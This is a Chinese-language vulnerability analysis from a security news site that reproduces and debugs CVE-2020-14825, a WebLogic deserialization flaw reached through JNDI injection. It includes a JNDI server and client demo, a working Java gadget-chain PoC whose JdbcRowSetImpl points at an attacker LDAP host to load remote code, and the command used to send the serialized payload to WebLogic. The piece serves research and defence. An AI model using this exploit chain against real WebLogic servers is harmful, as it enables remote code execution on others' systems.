# CVE-2020-14825——WebLogic反序列化

阅读量 **395399**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-03-29 10:30:17

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t0183403c7a04557994.jpg)

## 一、原理

###  （一）概述

不安全的反序列化漏洞已成为针对Java
Web应用程序的研究者的普遍目标。这些漏洞通常会导致RCE，并且通常不容易完全修补。CVE-2020-14825就属于这一类。

###  （二）CVE-2020-14825

前面我认为针对CVE-2015-4852的补丁的绕过有两种思路，一是寻找新的可利用的 _类_ （新gadget），二是换可触发利用链的反序列化 _点_
，感觉JNDI注入类的已经不属于不完全属于这两种思路了（脸好疼）。  
在这一类漏洞中，Victim反序列化的对象起到的是让Victim执行远程查询的效果，接下来直接加载远程class而没有像前面一样执行gadget类的readObject。  
然而，传过去的触发JNDI注入的对象依然值得我们关注。

###  （三）原理

JNDI（全称Java Naming and Directory Interface）是用于目录服务的Java
API，它允许Java客户端通过名称发现和查找数据和资源(以Java对象的形式)。和与主机系统接口的所有Java
api一样，JNDI独立于底层实现。此外，它指定了一个服务提供者接口(SPI)，该接口允许将目录服务实现插入到框架中。通过JNDI查询的信息可能由服务器、文件或数据库提供，选择取决于所使用的实现。

JNDI注入大致流程，

![](https://p1.ssl.qhimg.com/t01e1ce5aa50819091b.png)

1.攻击者向其控制的Naming/Directory服务上绑定一个恶意对象。  
2.攻击者向有漏洞的JDNI lookup方法发送恶意URL（ip为恶意N/D，且指向绑定的恶意对象）。  
3.Victim执行lookup。  
4.Victim向攻击者控制的N/D服务器发起查询，N/D返回恶意对象。  
5.Victim反序列化恶意对象，触发RCE。

个人理解，JNDI注入简单来说，
**就是在victim在执行lookup(URI)时，如果URI是恶意的，那么victim就会被攻击，所以JDNI最难的就是如何让victim来lookup我们构造的URI。**  
下面我们以一个常见的demo来简单演示JNDI攻击过程，

![](https://p5.ssl.qhimg.com/t0180ab508c29322f8b.png)

先是JNDIServer，

    
    
    package JNDI;
    
    import com.sun.jndi.rmi.registry.ReferenceWrapper;
    import javax.naming.NamingException;
    import javax.naming.Reference;
    import java.rmi.AlreadyBoundException;
    import java.rmi.RemoteException;
    import java.rmi.registry.Registry;
    import java.rmi.registry.LocateRegistry;
    
    public class JNDIServer {
        public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
            Registry registry = LocateRegistry.createRegistry(1099);
            Reference Exploit = new Reference("Exploit", "Exploit", "http://127.0.0.1:7077/");
            ReferenceWrapper refObjWrapper = new ReferenceWrapper(Exploit);
            registry.bind("Exploit", refObjWrapper);
    
        }
    }
    

再是JNDIClient，

    
    
    package JNDI;
    
    import javax.naming.Context;
    import javax.naming.InitialContext;
    import javax.naming.NamingException;
    import java.util.Properties;
    
    public class JNDIClient {
        public static void main(String[] args) throws NamingException {
            Properties env = new Properties();
            env.put(Context.INITIAL_CONTEXT_FACTORY,
                    "com.sun.jndi.rmi.registry.RegistryContextFactory");
            env.put(Context.PROVIDER_URL,
                    "rmi://127.0.0.1:7099/");
    
            Context ctx = new InitialContext(env);
            //ctx.lookup("Exploit");
            //ctx.lookup("rmi://127.0.0.1:1099/Exploit");
            ctx.lookup("ldap://127.0.0.1:7099/Exploit");
        }
    }
    

然后是我们要注册的恶意类，此处是Exploit，

    
    
    import java.util.Hashtable;
    import javax.naming.Context;
    import javax.naming.Name;
    import javax.naming.spi.ObjectFactory;
    
    public class Exploit implements ObjectFactory {
        public Exploit() {
        }
    
        public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
            return null;
        }
    
        static {
            try {
                String[] cmd = new String[]{"calc"};
                Runtime.getRuntime().exec(cmd);
            } catch (Exception var1) {
                var1.printStackTrace();
            }
    
        }
    }
    

接下来编译Exploit，并将class文件放在httpserver根目录下，  
启动server，

![](https://p1.ssl.qhimg.com/t015bd3fc0514f153c7.png)

启动JNDIServer,

![](https://p0.ssl.qhimg.com/t01aed99673c93d47dd.png)

启动JNDIClient，

![](https://p4.ssl.qhimg.com/t01317a846a293d0362.png)

可见，执行lookup(恶意url)，就有可能触发RCE。

这里，我们省去了最难的lookup之前这一部分，即让victim向JNDI
server发起请求，这一部分的实现就是同一类漏洞之间的差异了，我们将在调试环节详细演示。

## 二、调试

###  （一）环境搭建

此处选用 _Windows10、JDK8u41，webLogic12.1.4_  
若要查找调试此漏洞需要的包，可使用如下脚本（参见[脚本链接](https://my.oschina.net/mononite/blog/149235)），

    
    
    #!/bin/bash
    
    if [ $# -lt 1 ]; then
        echo "Usage: $0 name [path ...]";
        exit 2;
    fi
    
    name=${1//./\/};
    shift;
    path=${@:-.};
    
    function check-jar() {
        jar -tf "$1" | grep -iH --label "$1" "$name";
    }
    
    status=1;
    
    while read -r -d '' jarfile; do
        check-jar "$jarfile" && status=0;
    done < <(find $path -type f -name '*.jar' -size +22c -print0)
    
    exit $status;
    

![](https://p1.ssl.qhimg.com/t013388e13f3a4b757c.png)

另，调试此漏洞，JDK版本不宜过高， JDK8u113之后默认不允许RMI从远程的
Codebase加载Reference工厂类（系统属性com.sun.jndi.rmi.object.trustURLCodebase、
com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值为false）。  
若要修改weblogic的jdk版本，可参考[链接](https://blog.csdn.net/zflovecf/article/details/80838874)，  
修改文件X:\xxxx\user_projects\domains\base_domain\bin\setDomainEnv.cmd  
在call “%WL_HOME%..\oracle_common\common\bin\commEnv.cmd”  
一行后面增加

set JAVA_HOME=E:\Java\java8u41（ _Java路径_ ）

![](https://p4.ssl.qhimg.com/t01389fec7b6a2f4f02.png)

若要启动调试，可在startWebLogic.cmd中的首部加上

    
    
    set JAVA_OPTIONS=-Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,address=9999,server=y,suspend=n
    

![](https://p3.ssl.qhimg.com/t013c027b5d110f74a5.png)

类似的方法有很多，不再赘述

###  （二）复现

这里使用大佬生成payload的代码，[参考链接](https://github.com/rufherg/WebLogic_Basic_Poc/tree/master/poc)，

    
    
    import com.sun.rowset.JdbcRowSetImpl;
    import com.tangosol.util.comparator.ExtractorComparator;
    import oracle.eclipselink.coherence.integrated.internal.cache.LockVersionExtractor;
    import org.eclipse.persistence.internal.descriptors.MethodAttributeAccessor;
    import ysoserial.payloads.util.Reflections;
    
    import java.io.*;
    import java.util.PriorityQueue;
    
    public class CVE_2020_14825 {
        public static void main(String[] args) throws Exception {
            MethodAttributeAccessor accessor = new MethodAttributeAccessor();
            accessor.setAttributeName("x");
            accessor.setIsWriteOnly(true);
            accessor.setGetMethodName("getDatabaseMetaData");
    //        accessor.setGetMethodName("connect");        //与上面的getDatabaseMetaData基本等效
    
            LockVersionExtractor extractor = new LockVersionExtractor(accessor,"");
    
            JdbcRowSetImpl jdbcRowSet = Reflections.createWithoutConstructor(com.sun.rowset.JdbcRowSetImpl.class);
            jdbcRowSet.setDataSourceName("ldap://192.168.5.27:7099/#poc");
    
            PriorityQueue<Object> queue = new PriorityQueue(2, new ExtractorComparator(extractor));
            Reflections.setFieldValue(queue,"size",2);
    
            Object[] queueArray = (Object[])((Object[]) Reflections.getFieldValue(queue, "queue"));
            queueArray[0] = jdbcRowSet;
    
            ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(new File("cve_2020_14825.ser")));
            out.writeObject(queue);
            out.flush();
            out.close();
    //        readObject();    //不注释掉可以直接测试
        }
    
        public static void readObject() {
            FileInputStream fis = null;
            try {
                fis = new FileInputStream(new File("").getAbsolutePath() + "/cve_2020_14825.ser");
                ObjectInputStream ois = new ObjectInputStream(fis);
                ois.readObject();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
    

先启动weblogic server，

![](https://p5.ssl.qhimg.com/t010fef61854159d1aa.png)

再启动 **http服务** ，开在 **9090** 端口，

    
    
    py -3 -m http.server 9090
    

![](https://p4.ssl.qhimg.com/t01238c0fdb4b9f2723.png)

接下来是 **LDAP** server，服务开在 **7099** 端口，

![](https://p1.ssl.qhimg.com/t01a4675cd0b16aaf1c.png)

python发送payload即可，

    
    
    python2 .\weblogic.py 127.0.0.1 7001 .\cve_2020_14825.ser
    

![](https://p3.ssl.qhimg.com/t012bb1f37ec655c53f.png)

###  （三）调试

下面会结合部分上述代码进行调试分析，  
调用栈，

    
    
    connect:624, JdbcRowSetImpl (com.sun.rowset)
    getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:62, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:498, Method (java.lang.reflect)
    
    getAttributeValueFromObject:82, MethodAttributeAccessor (org.eclipse.persistence.internal.descriptors)
    getAttributeValueFromObject:61, MethodAttributeAccessor (org.eclipse.persistence.internal.descriptors)
    extract:51, LockVersionExtractor (oracle.eclipselink.coherence.integrated.internal.cache)
    compare:71, ExtractorComparator (com.tangosol.util.comparator)
    siftDownUsingComparator:722, PriorityQueue (java.util)
    siftDown:688, PriorityQueue (java.util)
    heapify:737, PriorityQueue (java.util)
    readObject:797, PriorityQueue (java.util)
    ...
    

将调用栈分作两段来分析。

**1.JdbcRowSetImpl部分**

从本文的原理部分我们可以看到，JdbcRowSetImpl的connect函数有lookup()的调用，那么我们要关注两点，一是参数是否 _可控_
，二是调用点是否 _可达_ 。

![](https://p3.ssl.qhimg.com/t0153f375ac39bfdbc8.png)

参数是否可控这一点理论上是比较容易看出的，  
看看getDataSourceName()，

![](https://p4.ssl.qhimg.com/t0187ae7505fce088a2.png)

dataSource是private变量，

![](https://p3.ssl.qhimg.com/t012381fa80ffa64dd9.png)

是可控的，

![](https://p2.ssl.qhimg.com/t01a9906f43bf6bb004.png)

这一部分在PoC中有所体现，

    
    
    JdbcRowSetImpl jdbcRowSet = Reflections.createWithoutConstructor(com.sun.rowset.JdbcRowSetImpl.class);
    jdbcRowSet.setDataSourceName("ldap://192.168.5.27:7099/#poc");
    

下面我们需要关注lookup调用点是否可达，首先要看，connect函数本身的内部，

![](https://p1.ssl.qhimg.com/t01d0ececf35482a7cb.png)

首先一点就是要保证this.conn为null，大致意思是这是首次连接，否则就要return conn。  
接下来才能进入else
if{}中，这时要保证this.getDataSourceName()不为null，这一点和我们控制dataSource的想法是一致的。

接下来的问题就是，如何调用connect，一般来讲我们发送给webLogic的对象要经过层层波折，最终才能到达这个触发点。

![](https://p3.ssl.qhimg.com/t013a4496c43e844686.png)

这里有三个函数prepare, getDatabaseMetaData，setAutoCommit，

都看一下，

![](https://p2.ssl.qhimg.com/t01f96507bbefae7a52.png)

![](https://p3.ssl.qhimg.com/t018b8e0e6b40eb223d.png)

![](https://p0.ssl.qhimg.com/t01ac751e5ee2bed2ec.png)

理论上都可以，毕竟都可以做到首次连接。  
PoC里用的是getDatabaseMetaData，到此，我们看看PoC对应的代码，

    
    
    accessor.setGetMethodName("getDatabaseMetaData");
    

当然，这里的setGetMethodName的参数不一定非要是”getDatabaseMetaData”，因为这里的getMethodName
是要被调用的， **只要能调用connect函数就行** ，直接调用connect都可。

所以有如下结果，

![](https://p5.ssl.qhimg.com/t01424366d0707ea491.png)

![](https://p5.ssl.qhimg.com/t0133393c0292419010.png)

**2.LockVersionExtractor部分**

这一部分我们从CC链部分开始看起，  
首先进入PriorityQueue的heapify，

![](https://p3.ssl.qhimg.com/t01da537a5b6cc8fdd6.png)

接下来，若要进入siftDown，需要保证queue的size至少为2，

![](https://p5.ssl.qhimg.com/t017b75c3ef3d3e9277.png)

对应代码里的，

    
    
    PriorityQueue<Object> queue = new PriorityQueue(2, new ExtractorComparator(extractor));
    Reflections.setFieldValue(queue,"size",2);
    

然后的流程和comparator有关，

![](https://p5.ssl.qhimg.com/t01d3a6e86e3d0cb27c.png)

这里我们已经控制了comparator为ExtractorComparator，对应代码的下面的片段，

    
    
    PriorityQueue<Object> queue = new PriorityQueue(2, new ExtractorComparator(extractor));
    

next，会顺利comparator.compare()，

![](https://p0.ssl.qhimg.com/t0181d4dbfb552d4037.png)

what follows is o1.extract()，这里的o1是上图的x，this.m_extractor为
**LockVersionExtractor** ，

![](https://p1.ssl.qhimg.com/t0161399dc2954ad191.png)

对应代码里的如下片段，

    
    
    LockVersionExtractor extractor = new LockVersionExtractor(accessor,"");
    ...
    Object[] queueArray = (Object[])((Object[]) Reflections.getFieldValue(queue, "queue"));
    queueArray[0] = jdbcRowSet;
    

then，顺利到达LockVersionExtractor.extract中的this.
**accessor**.getAttributeValueFromObject(arg0)（这里有一个小点，即为什么可以顺利到达，会在下面讲到）,

![](https://p5.ssl.qhimg.com/t01a884efbf28cbe76e.png)

往后，会进入重载的getAttributeValueFromObject()，

![](https://p0.ssl.qhimg.com/t01ca8bcd01acbfd4c6.png)

![](https://p2.ssl.qhimg.com/t01af9f369951fb357c.png)

顺利抵达上图中的this.getMethod.invoke()，

![](https://p4.ssl.qhimg.com/t0173aaeb2b4a695c75.png)

接下来就是正常的调用过程，此处就省略几步，直到下图，

![](https://p4.ssl.qhimg.com/t01449077c8e4ed6044.png)

正式调用getDatabaseMetaData，和前面的规划对接成功。

**3.其它**

LockVersionExtractor.extract()中有一个需要注意的小点如下，

    
    
    getAttributeValueFromObject:61, MethodAttributeAccessor (org.eclipse.persistence.internal.descriptors)
    extract:51, LockVersionExtractor (oracle.eclipselink.coherence.integrated.internal.cache)
    

在上面两步之间，会经历下面这样的过程，

![](https://p0.ssl.qhimg.com/t010a125f9bf1535d6b.png)

因为我们的目的是进入this.accessor.getAttributeValueFromObject(arg0)，我们就得保证程序可以顺利抵达return这一行，我们要防止在上图红圈那一行被打断。

我们看上图展示的点，

![](https://p2.ssl.qhimg.com/t017b89f9d28664a499.png)

应该是必然会进入if (!this.accessor.isInitialized())的，  
下面我们看this.accessor.initializeAttributes(arg0.getClass())，

![](https://p5.ssl.qhimg.com/t019c4e05e7d227f923.png)

发现如果this.getAttributeName() == null，就会抛出异常，后面的流程就无法执行。

![](https://p4.ssl.qhimg.com/t012fae335fa1bf519d.png)

所以我们需要设置一个attributeName;  
除此以外，下面还有一步，

![](https://p0.ssl.qhimg.com/t01198223e1f3b2c348.png)

可以看到，如果isWriteOnly为false，则会执行this.setSetMethod(Helper.getDeclaredMethod(theJavaClass,
this.getSetMethodName(), this.getSetMethodParameterTypes()));

![](https://p5.ssl.qhimg.com/t01a0ce7da97590f8a7.png)

跟进Helper.getDeclaredMethod()，

![](https://p5.ssl.qhimg.com/t01a5a14229acc491fc.png)

会进入PrivilegedAccessHelper.getMethod(javaClass, methodName,
methodParameterTypes, true);，

继续跟进，

![](https://p5.ssl.qhimg.com/t01be6c4932bfe81b06.png)

![](https://p1.ssl.qhimg.com/t01c0b047c188a1fa11.png)

可以看到，最终会调用javaClass.getDeclaredMethod(methodName, methodParameterTypes);

结合上面的情况，我们知道此处的methodName即为MethodAttributeAccessor.setMethodName，

![](https://p1.ssl.qhimg.com/t0151053feded25840b.png)

所以如果再向下执行，就会抛出异常，

![](https://p1.ssl.qhimg.com/t012542d6a285121f65.png)

这里我能想到的解决方法有二，一是将setMethodName设为一个有效值，如getDatabaseMetaData；第二种是将isWriteOnly设置为true，直接避免了后面的所有行为。

然而经测试，第一种没有用（可能是我愚钝不知哪里错了）。

![](https://p4.ssl.qhimg.com/t01f4c3caed131fe4a4.png)

将isWriteOnly设置为true更为简单有效。

所以我们看到，代码里有下面三行。

    
    
    accessor.setAttributeName("xxx");
    accessor.setIsWriteOnly(true);
    accessor.setGetMethodName("getDatabaseMetaData");
    

## 三、收获与启示

CVE-2020-14825和CVE-2020-14645有比较高的相似度，大致思路都是接上JdbcRowSetImpl的connect，而且二者也都使用了PrioritizeQueue
的模板链。这两个漏洞又一次向我们展示了拦腰截断的防御并不是特别有效，有一定的可能被counterpart接上。  
[参考链接](https://www.secpulse.com/archives/144831.html)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **northind** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/235233](/post/id/235233)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Web安全](/tag/Web安全)
  * [Weblogic](/tag/Weblogic)
  * [反序列化](/tag/反序列化)

 **+1** __4赞

 __收藏

![](https://p4.ssl.qhimg.com/t01f28ccab3282fc24b.png) northind

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

